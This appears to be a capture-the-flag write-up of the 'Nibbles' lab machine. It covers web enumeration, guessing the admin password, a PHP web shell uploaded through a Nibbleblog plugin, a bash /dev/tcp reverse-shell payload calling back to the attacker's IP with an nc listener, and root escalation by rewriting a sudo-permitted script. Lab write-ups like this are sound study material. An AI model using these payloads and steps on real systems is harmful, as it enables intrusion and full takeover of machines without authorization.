summary: "Nibbles is running a nibble blog on port 80 which is hidden behind the nibbleblog directory. Through a directory fuzz we can find an admin panel and are able to login through guessing the admin password. The site is vulnerable to an authenticated file upload RCE which we use to get user shell on the box. After which we find a vulnerable privilege to run a shell script in a directory where we have write access which we can use to escalate to root."

## HTTP
Running on port `80` is an `http` website running `Apache httpd 2.4.18`:\

Viewing the page source reveals something interesting:
```html
<b>Hello world!</b>














<!-- /nibbleblog/ directory. Nothing interesting here! -->
```
Navigating to that directory we find the following homepage:\

Nothing quite so interesting as they're all forbidden aside from `index.html`\
A directory scan on the `nibbleblog` directory found:

We have found a login page: `/nibbleblog/admin.php`:\
![Pasted image 20250213175925.png](/assets/img/2025-02-14-Nibbles/Pasted image 20250213175925.png)
Looking through the rest of the files we find `users.xml` which confirmed the username `admin` and some sort of blacklist which occurs when more than 5 incorrect login attempts are made:\
![Pasted image 20250214173423.png](/assets/img/2025-02-14-Nibbles/Pasted image 20250214173423.png)
Another file is `README` which contains the `nibbleblog` version: `v4.0.3`
Attempting to login guessing `nibbles` as the password works!
After loging in we reach an admin dashboard:\
![Pasted image 20250213180044.png](/assets/img/2025-02-14-Nibbles/Pasted image 20250213180044.png)
Viewing the `plugins` we find a `my image` plugin, which on initial testing is vulnerable to an arbitrary file upload.
# Vulnerability Assessment
## Nibbleblog File Upload Vulnerability
- url: https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog_file_upload/
The current enumerated version `v4.0.3` is known to be vulnerable to the exploit.

| Category   | Score |
| ---------- | ----- |
| Success    | 10    |
| Complexity | 5     |
| Damage     | -0    |
| Total      | 15    |
# Exploitation
Uploading the following PoC using the `my image` plugin:
```php
<?php system($_GET['cmd'])?>
```
Leads to the following errors being shown:
```
Warning: imagesx() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 26

Warning: imagesy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 27

Warning: imagecreatetruecolor(): Invalid image dimensions in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 117

Warning: imagedestroy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 80
```
Ignoring these and checking back on the homepage of the blog we can see the image title and caption for the image we uploaded:\
![Pasted image 20250213181150.png](/assets/img/2025-02-14-Nibbles/Pasted image 20250213181150.png)
opening the image in a new tab redirects to the following directory:
```
http://10.129.200.170/nibbleblog/content/private/plugins/my_image/image.jpg
```
if we replace `.jpg` with `.php?cmd=id` we get the following response:
```
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```
Success! we have a `WebShell!`
Uploading the following `PoC`:
```php
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.87/9001 0>&1'")?>
```
Starting a listener:
```
nc -lvnp 9001
```
And then browsing to the shell location:
```
http://10.129.200.170/nibbleblog/content/private/plugins/my_image/image.php
```
Leads to a `RevShell`!:
```
nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 10.129.200.170 34030
bash: cannot set terminal process group (1257): Inappropriate ioctl for device
bash: no job control in this shell
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$
```
# Post Exploitation
Looking around in our shell we find that we can run the following sudo command with no password:
```
sudo -l
(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
Seeing as we have write permissions in the home directory:
```
ls -la
total 24
drwxr-xr-x 4 nibbler nibbler 4096 Feb 14 01:11 .
drwxr-xr-x 3 root    root    4096 Dec 10  2017 ..
-rw------- 1 nibbler nibbler    0 Dec 29  2017 .bash_history
drwxrwxr-x 2 nibbler nibbler 4096 Dec 10  2017 .nano
drwxr-xr-x 3 nibbler nibbler 4096 Feb 14 01:11 personal
-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
-r-------- 1 nibbler nibbler   33 Mar 12  2021 user.txt
```
We can create a file called `monitor.sh` in `~/personal/stuff` with the following contents:
```bash
#!/bin/bash
bash
```
We then set the file to be executable:
```bash
chmod +x monitor.sh
```
and when we execute it as `sudo` we get a root shell!:
```
sudo ./monitor.sh
root@Nibbles:/home/nibbler/personal/stuff#
```
